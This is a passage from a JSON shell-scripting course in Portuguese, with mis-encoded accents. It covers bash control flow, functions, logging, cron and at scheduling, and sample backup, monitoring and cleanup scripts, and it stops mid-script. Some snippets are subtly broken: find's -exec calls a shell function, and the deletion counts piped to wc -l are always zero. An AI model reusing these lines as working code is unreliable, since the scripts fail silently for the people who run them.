üîÑ ESTRUTURA `if-then-else` COMPLETA:\n\n```bash\nif [ condi√ß√£o ]; then\n    # comandos se verdadeiro\nelif [ outra_condi√ß√£o ]; then\n    # comandos se segunda condi√ß√£o\nelse\n    # comandos se falso\nfi\n```\n\n#### üé≠ `case` (switch):\n\n```bash\ncase \"$opcao\" in\n    \"start\")\n        echo \"Iniciando servi√ßo...\"\n        ;;\n    \"stop\")\n        echo \"Parando servi√ßo...\"\n        ;;\n    \"restart\")\n        echo \"Reiniciando servi√ßo...\"\n        ;;\n    *)\n        echo \"Op√ß√£o inv√°lida: $opcao\"\n        ;;\nesac\n```\n\n### üîÑ Loops - Repetindo A√ß√µes\n\n#### üéØ `for` LOOP - PARA CADA ITEM:\n\n```bash\n#!/bin/bash\n# Loop por lista\nfor fruta in ma√ß√£ banana laranja; do\n    echo \"Fruta: $fruta\"\ndone\n\n# Loop por n√∫meros\nfor i in {1..5}; do\n    echo \"Contagem: $i\"\ndone\n\n# Loop por arquivos\nfor arquivo in *.txt; do\n    echo \"Processando: $arquivo\"\n    wc -l \"$arquivo\"\ndone\n\n# Comando seq\nfor i in $(seq 1 2 10); do  # 1 a 10, passo 2\n    echo $i\ndone\n```\n\n#### üöÄ `while` LOOP - ENQUANTO CONDI√á√ÉO:\n\n```bash\n#!/bin/bash\n# Contador\ncontador=1\nwhile [ $contador -le 10 ]; do\n    echo \"Contador: $contador\"\n    contador=$((contador + 1))\ndone\n\n# Ler arquivo linha por linha\nwhile read linha; do\n    echo \"Linha: $linha\"\ndone < \"arquivo.txt\"\n\n# Loop infinito (√∫til para servi√ßos)\nwhile true; do\n    echo \"Servi√ßo rodando...\"\n    sleep 60  # Espera 60 segundos\ndone\n```\n\n#### üîÑ `until` LOOP - AT√â QUE CONDI√á√ÉO:\n\n```bash\n#!/bin/bash\n# Esperar at√© que arquivo exista\narquivo=\"dados.csv\"\nuntil [ -f \"$arquivo\" ]; do\n    echo \"Aguardando $arquivo...\"\n    sleep 5\ndone\necho \"$arquivo encontrado!\"\n```\n\n### üéØ Fun√ß√µes - Modularizando seu C√≥digo\n\n#### üéØ FUN√á√ÉO B√ÅSICA:\n\n```bash\n#!/bin/bash\n# Definindo fun√ß√£o\nsaudacao() {\n    local nome=\"$1\"  # local = vari√°vel s√≥ existe na fun√ß√£o\n    echo \"Ol√°, $nome!\"\n    echo \"Hoje √© $(date)\"\n    return 0  # C√≥digo de retorno (0 = sucesso)\n}\n\n# Chamando fun√ß√£o\nsaudacao \"Maria\"\nsaudacao \"Jo√£o\"\n\n# Capturando retorno\nif saudacao \"Ana\"; then\n    echo \"Fun√ß√£o executou com sucesso\"\nfi\n```\n\n#### üöÄ FUN√á√ÉO COM RETORNO DE VALOR:\n\n```bash\n#!/bin/bash\n# Fun√ß√£o que calcula\nsoma() {\n    local a=$1\n    local b=$2\n    local resultado=$((a + b))\n    echo $resultado  # \"Retorna\" o valor\n}\n\n# Usando o retorno\ntotal=$(soma 10 20)\necho \"10 + 20 = $total\"\n\n# Pode ser usado diretamente\necho \"5 + 3 = $(soma 5 3)\"\n```\n\n#### üí° EXEMPLOS PR√ÅTICOS DE FUN√á√ïES:\n\n```bash\n# Fun√ß√£o simples\nsaudacao() {\n    echo \"Ol√°, $1!\"\n    return 0\n}\n\n# Fun√ß√£o para verificar servi√ßo\nverificar_servico() {\n    if systemctl is-active --quiet \"$1\"; then\n        echo \"‚úÖ Servi√ßo $1 est√° ativo\"\n        return 0\n    else\n        echo \"‚ùå Servi√ßo $1 est√° inativo\"\n        return 1\n    fi\n}\n\n# Sintaxes de defini√ß√£o\nfunction nome_funcao {\n    # corpo da fun√ß√£o\n    return valor\n}\n\n# OU\nnome_funcao() {\n    # corpo da fun√ß√£o\n    return valor\n}\n```\n\n### üõ°Ô∏è Boas Pr√°ticas em Scripts\n\n#### üéØ VALIDA√á√ÉO E TRATAMENTO DE ERROS:\n\n```bash\n#!/bin/bash\n# Boas pr√°ticas no in√≠cio do script\nset -e  # Sai se qualquer comando falhar\nset -u  # Erro se usar vari√°vel n√£o definida\nset -o pipefail  # Considera erro se qualquer parte do pipe falhar\n\n# Fun√ß√£o para tratamento de erros\nerro_handler() {\n    echo \"Erro na linha $1\" >&2\n    exit 1\n}\ntrap 'erro_handler $LINENO' ERR\n\n# Validar argumentos\nif [ $# -lt 2 ]; then\n    echo \"Uso: $0 <origem> <destino>\" >&2\n    exit 1\nfi\n```\n\n#### üìù LOGGING E DEBUG:\n\n```bash\n#!/bin/bash\n# Configura√ß√£o de log\nLOG_FILE=\"/var/log/meu_script.log\"\nexec > >(tee -a \"$LOG_FILE\") 2>&1  # Redireciona stdout e stderr para log\n\n# Fun√ß√£o de log\nlog() {\n    local nivel=$1\n    local mensagem=$2\n    echo \"[$(date '+%Y-%m-%d %H:%M:%S')] [$nivel] $mensagem\"\n}\n\n# Uso\nlog \"INFO\" \"Iniciando script...\"\nlog \"ERRO\" \"Algo deu errado!\"\n\n# Modo debug\nDEBUG=${DEBUG:-false}\nif [ \"$DEBUG\" = \"true\" ]; then\n    set -x  # Mostra cada comando antes de executar\nfi\n```\n\n#### üîß PROCESSAMENTO DE ARGUMENTOS AVAN√áADO:\n\n```bash\n#!/bin/bash\n# Processamento de op√ß√µes\nwhile [[ $# -gt 0 ]]; do\n    case $1 in\n        -h|--help)\n            echo \"Uso: $0 [op√ß√µes]\"\n            echo \"Op√ß√µes:\"\n            echo \"  -h, --help     Mostra esta ajuda\"\n            echo \"  -v, --verbose  Modo verboso\"\n            echo \"  -f ARQUIVO     Especifica arquivo\"\n            exit 0\n            ;;\n        -v|--verbose)\n            VERBOSE=true\n            shift\n            ;;\n        -f)\n            ARQUIVO=\"$2\"\n            shift 2\n            ;;\n        -*)\n            echo \"Op√ß√£o desconhecida: $1\" >&2\n            exit 1\n            ;;\n        *)\n            ARGS+=(\"$1\")\n            shift\n            ;;\n    esac\ndone\n```\n\n### üöÄ Exemplo Completo: Script de Backup\n\n```bash\n#!/bin/bash\n# backup_simples.sh - Script de backup com valida√ß√£o\n\n# Configura√ß√µes\nset -euo pipefail\nBACKUP_DIR=\"/backup\"\nDATA=$(date +%Y%m%d_%H%M%S)\nLOG_FILE=\"/var/log/backup_$DATA.log\"\n\n# Fun√ß√µes\nlog() {\n    echo \"[$(date '+%Y-%m-%d %H:%M:%S')] $*\" | tee -a \"$LOG_FILE\"\n}\n\nvalidar_diretorio() {\n    local dir=\"$1\"\n    if [ ! -d \"$dir\" ]; then\n        log \"ERRO\" \"Diret√≥rio n√£o existe: $dir\"\n        return 1\n    fi\n    if [ ! -r \"$dir\" ]; then\n        log \"ERRO\" \"Sem permiss√£o de leitura em: $dir\"\n        return 1\n    fi\n    return 0\n}\n\n# Validar argumentos\nif [ $# -lt 1 ]; then\n    echo \"Uso: $0 <diretorio1> [diretorio2 ...]\" >&2\n    exit 1\nfi\n\n# Criar diret√≥rio de backup\nmkdir -p \"$BACKUP_DIR\"\nlog \"INFO\" \"Iniciando backup...\"\n\n# Processar cada diret√≥rio\nfor dir in \"$@\"; do\n    if validar_diretorio \"$dir\"; then\n        nome_base=$(basename \"$dir\")\n        arquivo_backup=\"$BACKUP_DIR/${nome_base}_$DATA.tar.gz\"\n        \n        log \"INFO\" \"Backup de: $dir\"\n        tar -czf \"$arquivo_backup\" -C \"$(dirname \"$dir\")\" \"$(basename \"$dir\")\"\n        \n        tamanho=$(du -h \"$arquivo_backup\" | cut -f1)\n        log \"INFO\" \"Backup criado: $arquivo_backup ($tamanho)\"\n    else\n        log \"AVISO\" \"Pulando diret√≥rio inv√°lido: $dir\"\n    fi\ndone\n\n# Limpar backups antigos (mais de 30 dias)\nlog \"INFO\" \"Limpando backups antigos...\"\nfind \"$BACKUP_DIR\" -name \"*.tar.gz\" -mtime +30 -delete \\\n    -exec log \"INFO\" \"Removido: {}\" \\;\n\nlog \"INFO\" \"Backup conclu√≠do com sucesso!\"\nexit 0\n```",
    "examples": "```bash\n# Exemplo 1: Script de sauda√ß√£o personalizado\n#!/bin/bash\n# saudacao.sh\nnome=${1:-\"Visitante\"}\nhora=$(date +%H)\n\nif [ $hora -lt 12 ]; then\n    saudacao=\"Bom dia\"\nelif [ $hora -lt 18 ]; then\n    saudacao=\"Boa tarde\"\nelse\n    saudacao=\"Boa noite\"\nfi\n\necho \"$saudacao, $nome!\"\necho \"Hora atual: $(date '+%H:%M')\"\n\n# Uso:\n# $ ./saudacao.sh Jo√£o\n# Boa tarde, Jo√£o!\n# Hora atual: 15:30\n\n# Exemplo 2: Contador de palavras em arquivos\n#!/bin/bash\n# contar_palavras.sh\npalavra=\"$1\"\ndiretorio=\"${2:-.}\"\n\nif [ -z \"$palavra\" ]; then\n    echo \"Uso: $0 <palavra> [diretorio]\" >&2\n    exit 1\nfi\n\ntotal=0\necho \"Buscando '$palavra' em $diretorio...\"\n\nfor arquivo in \"$diretorio\"/*.txt; do\n    if [ -f \"$arquivo\" ]; then\n        contagem=$(grep -o -i \"$palavra\" \"$arquivo\" | wc -l)\n        echo \"$arquivo: $contagem ocorr√™ncias\"\n        total=$((total + contagem))\n    fi\ndone\n\necho \"\nTotal: $total ocorr√™ncias\"\n\n# Exemplo 3: Monitor de sistema simplificado\n#!/bin/bash\n# monitor.sh\nlimite_cpu=80\nlimite_memoria=85\n\nwhile true; do\n    clear\n    echo \"=== MONITOR DO SISTEMA ===\"\n    echo \"Data: $(date)\"\n    echo \"\"\n    \n    # CPU\n    uso_cpu=$(top -bn1 | grep \"Cpu(s)\" | awk '{print $2}' | cut -d'%' -f1)\n    echo \"CPU: ${uso_cpu}%\"\n    \n    # Mem√≥ria\n    uso_mem=$(free | awk '/Mem:/ {printf \"%.1f\", $3/$2 * 100}')\n    echo \"Mem√≥ria: ${uso_mem}%\"\n    \n    # Alertas\n    if [ $(echo \"$uso_cpu > $limite_cpu\" | bc) -eq 1 ]; then\n        echo \"‚ö†Ô∏è  ALERTA: CPU acima de ${limite_cpu}%\"\n    fi\n    \n    if [ $(echo \"$uso_mem > $limite_memoria\" | bc) -eq 1 ]; then\n        echo \"‚ö†Ô∏è  ALERTA: Mem√≥ria acima de ${limite_memoria}%\"\n    fi\n    \n    sleep 5\ndone\n\n# Exemplo 4: Organizador de downloads autom√°tico\n#!/bin/bash\n# organizador.sh\nDOWNLOADS=\"$HOME/Downloads\"\n\nfor arquivo in \"$DOWNLOADS\"/*; do\n    if [ -f \"$arquivo\" ]; then\n        extensao=\"${arquivo##*.}\"\n        case \"$extensao\" in\n            jpg|jpeg|png|gif)\n                pasta=\"Imagens\"\n                ;;\n            pdf|doc|docx|txt)\n                pasta=\"Documentos\"\n                ;;\n            mp4|avi|mkv)\n                pasta=\"Videos\"\n                ;;\n            mp3|wav)\n                pasta=\"Musicas\"\n                ;;\n            *)\n                pasta=\"Outros\"\n                ;;\n        esac\n        \n        mkdir -p \"$DOWNLOADS/$pasta\"\n        mv \"$arquivo\" \"$DOWNLOADS/$pasta/\"\n        echo \"Movido: $(basename \"$arquivo\") -> $pasta/\"\n    fi\ndone\necho \"Organiza√ß√£o conclu√≠da!\"\n```",
    "summary": "Neste m√≥dulo voc√™ aprendeu a transformar comandos simples em scripts poderosos. Dominou a cria√ß√£o de scripts com shebang, vari√°veis e estruturas de controle. Aprendeu a usar if/else para tomada de decis√µes, loops (for, while, until) para repeti√ß√£o de tarefas, e fun√ß√µes para modularizar c√≥digo. Tamb√©m viu como processar argumentos de linha de comando, implementar tratamento de erros, logging e outras boas pr√°ticas essenciais para scripts robustos. Agora voc√™ pode automatizar praticamente qualquer tarefa repetitiva no terminal.",
    "estimated_time_minutes": "120"
  },
  {
    "id": "module_5",
    "course_id": "shell_script_completo",
    "title": "Agendamento e Automa√ß√£o",
    "order": "5",
    "description": "Aprenda a automatizar a execu√ß√£o de scripts e tarefas em hor√°rios espec√≠ficos ou em resposta a eventos do sistema. Domine os agendadores cron e at para tornar suas automa√ß√µes verdadeiramente aut√¥nomas.",
    "learning_objectives": [
      "Compreender a estrutura e sintaxe do crontab",
      "Criar e gerenciar tarefas agendadas com cron",
      "Agendar tarefas √∫nicas com o comando at",
      "Configurar scripts de manuten√ß√£o autom√°tica do sistema",
      "Monitorar e depurar tarefas agendadas",
      "Implementar scripts de backup e limpeza automatizados"
    ],
    "key_concepts": [
      "Cron e crontab",
      "Agendamento peri√≥dico",
      "Execu√ß√£o √∫nica com at",
      "Tarefas de manuten√ß√£o",
      "Logs de execu√ß√£o",
      "Vari√°veis de ambiente no cron",
      "Permiss√µes para tarefas agendadas"
    ],
    "content": "## üï∞Ô∏è M√ìDULO 5: Agendamento e Automa√ß√£o\n\n### ‚è∞ `cron` - O Agendador Infal√≠vel\n\n**O que √© cron?** Um daemon (servi√ßo) que executa comandos em hor√°rios agendados. √â o cora√ß√£o da automa√ß√£o no Unix/Linux.\n\n#### üéØ ESTRUTURA DO CRONTAB:\n\n```\n# MIN HORA DIA MES DIA_SEM COMANDO\n# (0-59) (0-23) (1-31) (1-12) (0-7, 0=domingo)\n\n* * * * * comando                 # A cada minuto\n0 * * * * comando                 # A cada hora (minuto 0)\n0 0 * * * comando                 # Diariamente √† meia-noite\n0 0 * * 0 comando                 # Todo domingo √† meia-noite\n0 9-17 * * 1-5 comando            # Hor√°rio comercial, dias √∫teis\n*/15 * * * * comando              # A cada 15 minutos\n0 0 1 * * comando                 # Primeiro dia de cada m√™s\n```\n\n#### üìä COMPONENTES DO CRONTAB:\n\n| Campo | Valores | Descri√ß√£o |\n|-------|---------|-----------|\n| MIN | 0-59 | Minuto da hora |\n| HORA | 0-23 | Hora do dia (24h) |\n| DIA | 1-31 | Dia do m√™s |\n| MES | 1-12 | M√™s do ano |\n| DIA_SEM | 0-7 | Dia da semana (0 ou 7 = domingo) |\n\n#### üîß GERENCIANDO TAREFAS AGENDADAS:\n\n```bash\n# Editar crontab do usu√°rio atual\n$ crontab -e\n\n# Listar tarefas agendadas\n$ crontab -l\n\n# Remover todas as tarefas\n$ crontab -r\n\n# Carregar crontab de arquivo\n$ crontab meu_cron.txt\n\n# Listar crontab de outro usu√°rio (como root)\n$ sudo crontab -u usuario -l\n```\n\n#### üí° EXEMPLOS REAIS DE CRON:\n\n**Backup Di√°rio:**\n```bash\n# Todos os dias √†s 2:00 AM\n0 2 * * * /home/usuario/scripts/backup_diario.sh\n```\n\n**Limpeza Semanal:**\n```bash\n# Todo domingo √† 1:00 AM\n0 1 * * 0 /home/usuario/scripts/limpar_temporarios.sh\n```\n\n**Monitoramento Cont√≠nuo:**\n```bash\n# A cada 5 minutos, verificar sa√∫de do servidor\n*/5 * * * * /home/usuario/scripts/monitor_saude.sh\n```\n\n**Relat√≥rio Mensal:**\n```bash\n# Primeiro dia do m√™s √†s 6:00 AM\n0 6 1 * * /home/usuario/scripts/gerar_relatorio_mensal.sh\n```\n\n**Mais Exemplos de Agendamento:**\n```bash\n# A cada minuto\n* * * * * /caminho/script.sh\n\n# A cada hora (minuto 0)\n0 * * * * /backup/backup_hourly.sh\n\n# Diariamente √†s 2:30 AM\n30 2 * * * /backup/backup_daily.sh\n\n# Segunda a sexta √†s 9:00 AM\n0 9 * * 1-5 /scripts/relatorio_diario.sh\n\n# A cada domingo √† meia-noite\n0 0 * * 0 /maintenance/weekly_cleanup.sh\n\n# A cada 15 minutos\n*/15 * * * * /monitor/check_system.sh\n\n# Hor√°rio comercial (9AM-5PM, dias √∫teis)\n0 9-17 * * 1-5 /scripts/verificar_sistema.sh\n\n# No primeiro dia de cada m√™s\n0 0 1 * * /scripts/relatorio_mensal.sh\n\n# A cada 10 minutos durante hor√°rio comercial\n*/10 9-17 * * 1-5 /scripts/monitor_ativo.sh\n```\n\n#### üö® IMPORTANTE: VARI√ÅVEIS DE AMBIENTE NO CRON\n\nO cron roda em um ambiente m√≠nimo. Sempre defina vari√°veis necess√°rias:\n\n```bash\n# No in√≠cio do crontab\nSHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nMAILTO=seu@email.com\n\n# Agora os jobs\n0 2 * * * /home/usuario/scripts/backup.sh\n```\n\nOu dentro do script:\n```bash\n#!/bin/bash\n# Definir PATH no pr√≥prio script\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\nexport DATABASE_URL=\"postgres://user:pass@localhost/db\"\n# Resto do script\n```\n\n#### üìù LOGGING PARA TAREFAS CRON\n\n```bash\n# Redirecionar sa√≠da para log\n0 2 * * * /home/usuario/scripts/backup.sh >> /var/log/backup.log 2>&1\n\n# Log com data\n0 2 * * * /home/usuario/scripts/backup.sh >> /var/log/backup-$(date +\\%Y\\%m\\%d).log 2>&1\n\n# Separar stdout e stderr\n0 2 * * * /home/usuario/scripts/backup.sh > /var/log/backup.log 2> /var/log/backup_error.log\n```\n\n### üìÖ `at` - Agendamento para Execu√ß√£o √önica\n\n**Para que serve?** Executar um comando uma √∫nica vez em um hor√°rio espec√≠fico.\n\n#### üéØ AGENDANDO TAREFAS √öNICAS:\n\n```bash\n# Agendar para daqui a 1 hora\n$ echo \"shutdown -h now\" | at now + 1 hour\n\n# Amanh√£ √†s 10:00\n$ echo \"/caminho/script.sh\" | at 10:00 tomorrow\n\n# Pr√≥xima sexta √†s 18:00\n$ echo \"tar -czf backup.tar.gz /dados\" | at 18:00 fri\n\n# Data espec√≠fica\n$ echo \"notify-send 'Reuni√£o!'\" | at 14:30 2024-12-25\n\n# Express√µes de tempo relativas\n$ echo \"comando\" | at now + 2 days\n$ echo \"comando\" | at now + 3 weeks\n$ echo \"comando\" | at now + 1 month\n$ echo \"comando\" | at teatime   # 16:00\n$ echo \"comando\" | at midnight  # 00:00\n```\n\n#### üîß GERENCIANDO JOBS `at`:\n\n```bash\n# Listar jobs agendados\n$ atq\n10  Fri Dec 25 14:30:00 2024 a usuario\n\n# Ver detalhes de um job\n$ at -c 10\n# Mostra o comando que ser√° executado\n\n# Remover job\n$ atrm 10\n\n# Ver jobs de outro usu√°rio (como root)\n$ sudo atq -u outro_usuario\n```\n\n#### üí° DIFEREN√áAS ENTRE `cron` E `at`:\n\n| Caracter√≠stica | `cron` | `at` |\n|----------------|--------|------|\n| Tipo | Peri√≥dico/recorrente | √önica execu√ß√£o |\n| Uso t√≠pico | Backup di√°rio, limpeza | Lembrete, tarefa √∫nica |\n| Persist√™ncia | Permanece at√© removido | Executa e desaparece |\n| Complexidade | Mais complexo | Mais simples |\n| Log | Necess√°rio configurar | Pode redirecionar sa√≠da |\n\n### ü§ñ Scripts de Manuten√ß√£o - Exemplos Prontos\n\n#### üì¶ SCRIPT DE BACKUP AUTOM√ÅTICO:\n\n```bash\n#!/bin/bash\n# backup_automatico.sh\n# Realiza backup incremental com data\n\n# Configura√ß√µes\nset -euo pipefail\nBACKUP_DIR=\"/backup\"\nDATA=$(date +%Y%m%d_%H%M%S)\nLOG_FILE=\"/var/log/backup_$DATA.log\"\nRETENCAO_DIAS=30\n\n# Fun√ß√£o de log\nlog() {\n    echo \"[$(date '+%Y-%m-%d %H:%M:%S')] $*\" | tee -a \"$LOG_FILE\"\n}\n\n# Verificar se √© root\nif [ \"$EUID\" -ne 0 ]; then\n    log \"ERRO: Execute como root ou com sudo\"\n    exit 1\nfi\n\nlog \"=== INICIANDO BACKUP ===\"\n\n# Backup de diret√≥rios importantes\nbackup_diretorio() {\n    local origem=\"$1\"\n    local nome=\"$2\"\n    local destino=\"$BACKUP_DIR/${nome}_$DATA.tar.gz\"\n\n    if [ -d \"$origem\" ]; then\n        tar -czf \"$destino\" -C \"$(dirname \"$origem\")\" \"$(basename \"$origem\")\" 2>/dev/null\n        if [ $? -eq 0 ]; then\n            log \"‚úÖ $origem -> $(du -h \"$destino\" | cut -f1)\"\n        else\n            log \"‚ùå Falha no backup de $origem\"\n        fi\n    else\n        log \"‚ö†Ô∏è $origem n√£o existe, pulando\"\n    fi\n}\n\n# Diret√≥rios para backup\nbackup_diretorio \"/etc\" \"etc\"\nbackup_diretorio \"/home\" \"home\"\nbackup_diretorio \"/var/www\" \"www\"\nbackup_diretorio \"/var/log\" \"logs\"\n\n# Limpar backups antigos\nlog \"Limpando backups com mais de $RETENCAO_DIAS dias...\"\nfind \"$BACKUP_DIR\" -name \"*.tar.gz\" -mtime +$RETENCAO_DIAS -delete -exec log \"üóëÔ∏è Removido: {}\" \\;\n\n# Verificar espa√ßo\nESPACO_LIVRE=$(df -h \"$BACKUP_DIR\" | awk 'NR==2 {print $4}')\nlog \"Backup conclu√≠do! Espa√ßo livre: $ESPACO_LIVRE\"\nlog \"====================================\"\n```\n\n**Configura√ß√£o no cron para backup:**\n```bash\n# Editar crontab: crontab -e\n0 2 * * * /home/usuario/scripts/backup_automatico.sh >> /var/log/backup_cron.log 2>&1\n```\n\n#### ü©∫ SCRIPT DE MONITORAMENTO DE SA√öDE:\n\n```bash\n#!/bin/bash\n# monitor_saude.sh\n# Monitora recursos do sistema e envia alertas\n\n# Configura√ß√µes\nLIMITE_CPU=80\nLIMITE_MEMORIA=90\nLIMITE_DISCO=85\nEMAIL_ADMIN=\"admin@empresa.com\"\nLOG_FILE=\"/var/log/monitor_saude.log\"\n\n# Fun√ß√£o de log\nlog() {\n    echo \"[$(date '+%Y-%m-%d %H:%M:%S')] $*\" >> \"$LOG_FILE\"\n}\n\n# Coletar m√©tricas\nCPU=$(top -bn1 | grep \"Cpu(s)\" | awk '{print $2}' | cut -d'%' -f1)\nMEMORIA=$(free | awk '/Mem:/ {printf \"%.0f\", $3/$2 * 100}')\nDISCO=$(df / | awk 'NR==2 {print $5}' | sed 's/%//')\n\n# Verificar alertas\nALERTAS=\"\"\n\nif [ \"$CPU\" -gt \"$LIMITE_CPU\" ]; then\n    ALERTAS+=\"‚ö†Ô∏è CPU: ${CPU}% (limite: ${LIMITE_CPU}%)\n\"\nfi\n\nif [ \"$MEMORIA\" -gt \"$LIMITE_MEMORIA\" ]; then\n    ALERTAS+=\"‚ö†Ô∏è Mem√≥ria: ${MEMORIA}% (limite: ${LIMITE_MEMORIA}%)\n\"\nfi\n\nif [ \"$DISCO\" -gt \"$LIMITE_DISCO\" ]; then\n    ALERTAS+=\"‚ö†Ô∏è Disco: ${DISCO}% (limite: ${LIMITE_DISCO}%)\n\"\nfi\n\n# Se houver alertas, notificar\nif [ -n \"$ALERTAS\" ]; then\n    log \"ALERTA: $ALERTAS\"\n    \n    # Enviar email se comando mail estiver dispon√≠vel\n    if command -v mail &> /dev/null; then\n        echo -e \"ALERTA DE SISTEMA\n\nM√©tricas:\n$ALERTAS\nData: $(date)\" | \\\n        mail -s \"ALERTA: Sistema sobrecarregado\" \"$EMAIL_ADMIN\"\n    else\n        # Alternativa: escrever em arquivo para outro processo enviar\n        echo \"$(date) - $ALERTAS\" >> /tmp/alertas_pendentes.txt\n    fi\nelse\n    log \"Sistema OK - CPU: ${CPU}%, Mem: ${MEMORIA}%, Disco: ${DISCO}%\"\nfi\n```\n\n**Configura√ß√£o no cron para monitoramento:**\n```bash\n# Monitorar a cada 5 minutos\n*/5 * * * * /home/usuario/scripts/monitor_saude.sh\n```\n\n#### üßπ SCRIPT DE LIMPEZA AUTOM√ÅTICA:\n\n```bash\n#!/bin/bash\n# limpeza_sistema.sh\n# Remove arquivos tempor√°rios e logs antigos\n\n# Configura√ß√µes\nset -euo pipefail\nLOG_FILE=\"/var/log/limpeza_$(date +%Y%m%d).log\"\nDIAS_LOGS=30\nDIAS_TEMP=7\nDIAS_CACHE=14\n\nlog() {\n    echo \"[$(date '+%Y-%m-%d %H:%M:%S')] $*\" | tee -a \"$LOG_FILE\"\n}\n\nlog \"=== INICIANDO LIMPEZA DO SISTEMA ===\"\n\n# Limpar arquivos tempor√°rios do sistema\nlog \"Limpando arquivos tempor√°rios...\"\nfind /tmp -type f -mtime +$DIAS_TEMP -delete 2>/dev/null | wc -l | \\\n    xargs -I {} log \"Removidos {} arquivos de /tmp\"\nfind /var/tmp -type f -mtime +$DIAS_TEMP -delete 2>/dev/null | wc -l | \\\n    xargs -I {} log \"Removidos {} arquivos de /var/tmp\"\n\n# Limpar logs antigos\nlog \"Limpando logs antigos (mais de $DIAS_LOGS dias)...\"\nfind /var/log -name \"*.log\" -mtime +$DIAS_LOGS -delete 2>/dev/null | wc -l | \\\n    xargs -I {} log \"Removidos {} arquivos de log\"\n\n# Limpar cache do apt/dnf (se existir)\nif command -v apt-get >/dev/null 2>&1; then\n    log \"Limpando cache do APT...\"\n    apt-get clean\n    apt-get autoclean\n    apt-get autoremove -y\nelif command -v dnf >/dev/null 2>&1; then\n    log \"Limpando cache do DNF...\"\n    dnf clean all\nfi\n\n# Limpar cache do usu√°rio\nlog \"Limpando cache de usu√°rio...\"\nfind /home -type f -name \"*.cache\" -mtime +$DIAS_CACHE -delete 2>/dev/null | wc -l | \\\n    xargs -I {} log \"Removidos {} arquivos .cache\"\n\n# Verificar espa√ßo liberado\nESPACO_LIVRE=$(df -h / | awk 'NR==2 {print $4}')\nlog \"Limpeza conclu√≠da! Espa√ßo livre em /: $ESPACO_LIVRE\"\nlog \"==============================================\"\n```\n\n**Configura√ß√£o no cron para limpeza:**\n```bash\n# Limpeza semanal aos domingos √†s 3:00 AM\n0 3 * * 0 /home/usuario/scripts/limpeza_sistema.sh >> /var/log/limpeza_cron.log 2>&1\n```\n\n### üîç MONITORAMENTO E DEPURA√á√ÉO DE TAREFAS AGENDADAS\n\n#### üéØ VERIFICANDO SE CRON EST√Å RODANDO:\n\n```bash\n# Verificar status do servi√ßo cron\n$ sudo systemctl status cron\n# ou\n$ sudo service cron status\n\n# Verificar logs do cron\n$ sudo tail -f /var/log/syslog | grep cron\n# ou no sistema moderno\n$ sudo journalctl -u cron -f\n```\n\n#### üêõ DEPURANDO PROBLEMAS NO CRON:\n\n**Problema comum:** Script funciona manualmente mas n√£o no cron.\n\n**Solu√ß√£o:**\n```bash\n# 1. Verificar PATH no cron\n$ crontab -l\n# Adicione no topo:\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\n# 2. Redirecionar toda sa√≠da para log\n0 2 * * * /caminho/script.sh >> /tmp/cron_debug.log 2>&1\n\n# 3. Testar com vari√°veis de ambiente\n$ env - /bin/bash -c '/caminho/script.sh'\n# Isso simula o ambiente m√≠nimo do cron\n\n# 4. Verificar permiss√µes\n$ ls -l /caminho/script.sh\n# O script deve ser execut√°vel\n$ chmod +x /caminho/script.sh\n\n# 5. Verificar se precisa de sudo\n# Se o script precisa de privil√©gios, edite o crontab do root\n$ sudo crontab -e\n```\n\n#### üìä SCRIPT DE VERIFICA√á√ÉO DE TAREFAS AGENDADAS:\n\n```bash\n#!/bin/bash\n# verificar_cron.sh\n# Verifica status das tarefas agendadas\n\necho \"=== VERIFICA√á√ÉO DE TAREFAS AGENDADAS ===\"\necho \"Data: $(date)\"\necho \"\"\n\n# 1. Verificar servi√ßo cron\necho \"1. Status do servi√ßo cron:\"\nif systemctl is-active --quiet cron; then\n    echo \"‚úÖ Cron est√° ativo\"\nelse\n    echo \"‚ùå Cron n√£o est√° ativo\"\n    echo \"Tentando iniciar...\"\n    sudo systemctl start cron\nfi\necho \"\"\n\n# 2. Listar tarefas do usu√°rio atual\necho \"2. Tarefas do usu√°rio $USER:\"\ncrontab -l 2>/dev/null || echo \"Nenhuma tarefa agendada\"\necho \"\"\n\n# 3. Verificar tarefas do root\necho \"3. Tarefas do root:\"\nsudo crontab -l 2>/dev/null | head -10\necho \"\"\n\n# 4. Verificar logs recentes\necho \"4. √öltimas execu√ß√µes do cron:\"\nsudo grep cron /var/log/syslog | tail -5 || \\\n    sudo journalctl -u cron --since \"1 hour ago\" | tail -5\necho \"\"\n\necho \"Verifica√ß√£o conclu√≠da!\"\n```\n\n### üöÄ EXEMPLO COMPLETO: SISTEMA DE BACKUP INCREMENTAL\n\n```bash\n#!/bin/bash\n# backup_incremental.sh\n# Sistema de backup com reten√ß√£o e relat√≥rio\n\n# Configura√ß√µes\nset -euo pipefail\nBACKUP_BASE=\"/backup\"\nDATA=$(date +%Y%m%d)\nHORA=$(date +%H%M)\nBACKUP_DIR=\"$BACKUP_BASE/$DATA\"\nLOG_DIR=\"/var/log/backup\"\nLOG_FILE=\"$LOG_DIR/backup_${DATA}_${HORA}.log\"\nRETENCAO_DIAS=7\nEMAIL_RELATORIO=\"admin@empresa.com\"\n\n# Diret√≥rios para backup (ajustar conforme necessidade)\nDIRETORIOS_BACKUP=(\n    \"/etc\"\n    \"/home\"\n    \"/var/www\"\n    \"/var/lib/postgresql\"\n)\n\n# Criar diret√≥rios necess√°rios\nmkdir -p \"$BACKUP_DIR\" \"$LOG_DIR\"\n\n# Fun√ß√µes\nlog() {\n    local nivel=$1\n    local mensagem=$2\n    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')\n    echo \"[$timestamp] [$nivel] $mensagem\" | tee -a \"$LOG_FILE\"\n}\n\nenviar_relatorio() {\n    local assunto=$1\n    local corpo=$2\n    \n    if command -v mail &> /dev/null; then\n        echo -e \"$corpo\" | mail -s \"$assunto\" \"$EMAIL_RELATORIO\"\n        log \"INFO\" \"Relat√≥rio enviado para $EMAIL_RELATORIO\"\n    else\n        log \"AVISO\" \"Comando mail n√£o dispon√≠vel, relat√≥rio salvo em $LOG_FILE\"\n    fi\n}\n\n# Iniciar backup\nlog \"INFO\" \"=== INICIANDO BACKUP INCREMENTAL ===\"\nlog \"INFO\" \"Diret√≥rio de backup: $BACKUP_DIR\"\n\nTOTAL_ORIGEM=0\nTOTAL_BACKUP=0\n\n# Fazer backup de cada diret√≥rio\nfor dir in \"${DIRETORIOS_BACKUP[@]}\"; do\n    if [ -d 